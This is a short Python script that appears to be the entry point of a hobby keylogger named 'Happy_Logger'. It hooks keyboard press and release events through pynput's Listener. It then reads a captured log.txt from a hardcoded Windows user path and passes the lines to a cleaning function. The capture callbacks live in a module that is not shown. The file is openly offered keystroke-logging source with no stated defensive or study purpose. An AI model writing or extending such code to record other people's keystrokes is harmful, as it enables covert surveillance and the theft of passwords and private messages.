
from pynput.keyboard import Listener
from functions.Functions import keypress, key_depressed, Cleaner

with Listener(on_press=keypress,on_release=key_depressed) as listener:
    listener.join()

file = open('C:/Users/admin/Desktop/Juanes/Programacion/PROGRAMAS PYTHON/ProgramsPY/Happy_Logger 1/log.txt', 'r')

brute_register = file.readlines() 

Cleaner(brute_register)


file.close()













